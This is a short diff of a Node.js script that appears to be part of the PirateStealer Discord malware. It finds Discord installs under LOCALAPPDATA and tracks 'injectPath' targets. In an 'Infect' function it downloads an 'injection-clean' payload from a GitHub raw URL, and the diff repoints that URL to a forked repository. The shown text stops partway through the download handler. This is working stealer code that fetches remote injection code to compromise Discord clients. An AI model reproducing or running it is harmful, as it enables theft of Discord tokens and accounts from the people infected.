@@ -25,8 +25,7 @@ var LOCAL = process.env.LOCALAPPDATA
 var discords = [];
 var injectPath = [];
 var runningDiscords = [];
-
-
+ 
 fs.readdirSync(LOCAL).forEach(file => {
     if (file.includes("iscord")) {
         discords.push(LOCAL + '\\' + file)
@@ -44,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/bytixo/PirateStealer/dev/src/Injection/injection-clean', (resp) => {
+    https.get('https://raw.githubusercontent.com/StampyGumball/pirate-stealer-by-bytixo/main/src/Injection/injection-clean', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
